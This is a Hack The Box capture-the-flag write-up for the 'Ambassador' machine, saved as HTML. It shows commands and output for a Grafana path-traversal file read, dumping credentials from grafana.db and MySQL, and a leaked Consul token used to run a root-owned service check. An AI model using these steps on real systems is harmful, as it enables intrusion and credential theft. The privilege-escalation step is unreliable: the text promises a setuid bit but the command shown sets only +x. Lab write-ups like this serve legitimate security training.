@@ -1,0 +1,328 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HTB - Ambassador [Medium] // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.0fb49e70a30412f97ddfc418e18fefef1d9fcdebe45f634dbbba768b00fe1eec.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Ambassador [Medium]"/>
+<meta name="twitter:description" content="Scanning &gt; TARGET=10.129.51.137 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))|_http-generator: Hugo 0.94.2|_http-title: Ambassador Development Server| http-methods: |_ Supported Methods: OPTIONS HEAD GET POST|_http-server-header: Apache/2."/>
+
+    <meta property="og:title" content="HTB - Ambassador [Medium]" />
+<meta property="og:description" content="Scanning &gt; TARGET=10.129.51.137 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))|_http-generator: Hugo 0.94.2|_http-title: Ambassador Development Server| http-methods: |_ Supported Methods: OPTIONS HEAD GET POST|_http-server-header: Apache/2." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/htb/ambassador/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2022-10-02T23:18:05+13:00" />
+<meta property="article:modified_time" content="2022-10-02T23:18:05+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB - Ambassador [Medium]</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Oct 2, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          5 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="scanning">Scanning</h1>
+<pre tabindex="0"><code>&gt; TARGET=10.129.51.137 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
+
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: Hugo 0.94.2
+|_http-title: Ambassador Development Server
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+3000/tcp open  ppp?    syn-ack ttl 63
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 302 Found
+|     Cache-Control: no-cache
+|     Content-Type: text/html; charset=utf-8
+|     Expires: -1
+|     Location: /login
+|     Pragma: no-cache
+|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: deny
+|     X-Xss-Protection: 1; mode=block
+|     Date: Sun, 02 Oct 2022 20:26:47 GMT
+|     Content-Length: 29
+|     href=&#34;/login&#34;&gt;Found&lt;/a&gt;.
+|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 302 Found
+|     Cache-Control: no-cache
+|     Content-Type: text/html; charset=utf-8
+|     Expires: -1
+|     Location: /login
+|     Pragma: no-cache
+|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: deny
+|     X-Xss-Protection: 1; mode=block
+|     Date: Sun, 02 Oct 2022 20:26:02 GMT
+|     Content-Length: 29
+|     href=&#34;/login&#34;&gt;Found&lt;/a&gt;.
+|   HTTPOptions: 
+|     HTTP/1.0 302 Found
+|     Cache-Control: no-cache
+|     Expires: -1
+|     Location: /login
+|     Pragma: no-cache
+|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: deny
+|     X-Xss-Protection: 1; mode=block
+|     Date: Sun, 02 Oct 2022 20:26:10 GMT
+|_    Content-Length: 0
+3306/tcp open  mysql   syn-ack ttl 63 MySQL 8.0.30-0ubuntu0.20.04.2
+| mysql-info: 
+|   Protocol: 10
+|   Version: 8.0.30-0ubuntu0.20.04.2
+|   Thread ID: 9
+|   Capabilities flags: 65535
+|   Some Capabilities: DontAllowDatabaseTableColumn, FoundRows, ConnectWithDatabase, SupportsLoadDataLocal, Speaks41ProtocolOld, ODBCClient, IgnoreSpaceBeforeParenthesis, Support41Auth, IgnoreSigpipes, SwitchToSSLAfterHandshake, LongColumnFlag, SupportsCompression, LongPassword, SupportsTransactions, Speaks41ProtocolNew, InteractiveClient, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
+|   Status: Autocommit
+|   Salt: \x07\x1Ao     S#`HQUWw&gt;\x138V&#39;]V%
+|_  Auth Plugin Name: caching_sha2_password
+|_tls-alpn: ERROR: Script execution failed (use -d to debug)
+|_ssl-date: ERROR: Script execution failed (use -d to debug)
+| ssl-cert: Subject: commonName=MySQL_Server_8.0.28_Auto_Generated_Server_Certificate
+| Issuer: commonName=MySQL_Server_8.0.28_Auto_Generated_CA_Certificate
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-03-13T22:27:05
+| Not valid after:  2032-03-10T22:27:05
+| MD5:   add1 0a46 7692 932b c703 ffea c49b 63b0
+| SHA-1: da31 03a2 1f92 d0be b27b d285 b7d6 5a87 c25f e433
+</code></pre><h1 id="web-enum-80">Web Enum: 80</h1>
+<ul>
+<li>http://10.129.51.137/posts/welcome-to-the-ambassador-development-server/</li>
+</ul>
+<pre tabindex="0"><code>Use the developer account to SSH, DevOps will give you the password.
+</code></pre><ul>
+<li>dirsearch</li>
+</ul>
+<pre tabindex="0"><code>&gt; dirsearch -u http://10.129.51.137 -x 403,404,500
+                 
+[16:39:53] 200 -    2KB - /404.html
+[16:40:28] 301 -  319B  - /categories  -&gt;  http://10.129.51.137/categories/
+[16:40:53] 301 -  315B  - /images  -&gt;  http://10.129.51.137/images/
+[16:40:53] 200 -  994B  - /images/
+[16:40:54] 200 -    4KB - /index.html
+[16:40:55] 200 -    1KB - /index.xml
+[16:41:21] 301 -  314B  - /posts  -&gt;  http://10.129.51.137/posts/
+[16:41:32] 200 -  645B  - /sitemap.xml
+[16:41:38] 301 -  313B  - /tags  -&gt;  http://10.129.51.137/tags/
+</code></pre><h1 id="web-enum-3000">Web Enum: 3000</h1>
+<ul>
+<li>Browse to http://10.129.51.137:3000/login, found <code>grafana</code> and version <code>v8.2.0 (d7f71e9eae)</code></li>
+<li>Google on web and found this: <a href="https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/">https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/</a></li>
+<li>Using this exploit: <a href="https://www.exploit-db.com/exploits/50581">https://www.exploit-db.com/exploits/50581</a></li>
+</ul>
+<pre tabindex="0"><code>&gt; python 50581.py -H http://10.129.51.137:3000
+Read file &gt; /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+developer:x:1000:1000:developer:/home/developer:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+grafana:x:113:118::/usr/share/grafana:/bin/false
+mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
+consul:x:997:997::/home/consul:/bin/false
+
+Read file &gt; /etc/grafana/grafana.ini
+# default admin password, can be changed before first start of grafana,  or in profile settings
+admin_password = messageInABottle685427
+</code></pre><ul>
+<li>Can login as <code>admin:m*</code></li>
+</ul>
+<h1 id="grafana">Grafana</h1>
+<ul>
+<li>Dump the database</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl --path-as-is http://10.129.51.137:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
+
+# in .table data_source, found the db info
+user: grafana
+db: grafana
+password: dontStandSoCloseToMe63221!
+</code></pre><h1 id="mysql">mysql</h1>
+<ul>
+<li>Using the above credential, we can login to the mysql db</li>
+</ul>
+<pre tabindex="0"><code>&gt; mysql -h 10.129.51.137 -u grafana -p
+</code></pre><ul>
+<li>Explore the db and locate the password for <code>developer</code></li>
+</ul>
+<pre tabindex="0"><code>MySQL [(none)]&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| grafana            |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| whackywidget       |
++--------------------+
+
+MySQL [(none)]&gt; use whackywidget
+MySQL [whackywidget]&gt; show tables;
++------------------------+
+| Tables_in_whackywidget |
++------------------------+
+| users                  |
++------------------------+
+
+MySQL [whackywidget]&gt; select * from users;
++-----------+------------------------------------------+
+| user      | pass                                     |
++-----------+------------------------------------------+
+| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
++-----------+------------------------------------------+
+</code></pre><ul>
+<li>Decode to get the password: <code>anEnglishManInNewYork027468</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; echo &#39;YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==&#39; | base64 -d
+</code></pre><ul>
+<li>Login via ssh as developer and get the user flag</li>
+</ul>
+<h1 id="local-enum">Local enum</h1>
+<ul>
+<li>Local enum found a folder owned by root with read access to developer and contains a .git repo</li>
+</ul>
+<pre tabindex="0"><code>developer@ambassador:/opt/my-app$ ls -la
+total 24
+drwxrwxr-x 5 root root 4096 Mar 13  2022 .
+drwxr-xr-x 4 root root 4096 Sep  1 22:13 ..
+drwxrwxr-x 4 root root 4096 Mar 13  2022 env
+drwxrwxr-x 8 root root 4096 Mar 14  2022 .git
+-rw-rw-r-- 1 root root 1838 Mar 13  2022 .gitignore
+drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget
+</code></pre><ul>
+<li>Showing the git history found a token and a command</li>
+</ul>
+<pre tabindex="0"><code>git show
+commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main)
+Author: Developer &lt;developer@ambassador.local&gt;
+Date:   Sun Mar 13 23:47:36 2022 +0000
+
+    tidy config script
+
+diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
+index 35c08f6..fc51ec0 100755
+--- a/whackywidget/put-config-in-consul.sh
++++ b/whackywidget/put-config-in-consul.sh
+@@ -1,4 +1,4 @@
+ # We use Consul for application config in production, this script will help set the correct values for the app
+-# Export MYSQL_PASSWORD before running
++# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
+ 
+-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
++consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
+</code></pre><h1 id="pe-consul-api">PE: consul API</h1>
+<ul>
+<li>Search online found the following resources regarding exploiting <code>consul</code>
+<ul>
+<li><a href="https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/misc/consul_service_exec">https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/misc/consul_service_exec</a></li>
+<li><a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/consul_service_exec.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/consul_service_exec.rb</a></li>
+</ul>
+</li>
+<li>Create a <code>e.sh</code> script under tmp to hold our payload, in here, i add +s to <code>/usr/bin/bash</code>. Then use consul API to register a task to run as root</li>
+</ul>
+<pre tabindex="0"><code>&gt; echo &#39;chmod +x /usr/bin/bash&#39; &gt; /tmp/e.sh
+</code></pre><ul>
+<li>Register a consul service to trigger the exploit</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl --header &#34;X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5&#34; --request PUT -d &#39;{&#34;ID&#34;: &#34;meow&#34;, &#34;Name&#34;: &#34;meow&#34;, &#34;Address&#34;: &#34;127.0.0.1&#34;, &#34;Port&#34;: 80, &#34;check&#34;: {&#34;Args&#34;: [&#34;/usr/bin/bash&#34;, &#34;/tmp/e.sh&#34;], &#34;interval&#34;: &#34;10s&#34;, &#34;timeout&#34;: &#34;1s&#34;}}&#39; http://127.0.0.1:8500/v1/agent/service/register
+</code></pre><ul>
+<li>Prompt as effective root and get the root flag</li>
+</ul>
+<pre tabindex="0"><code>&gt; bash -p
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
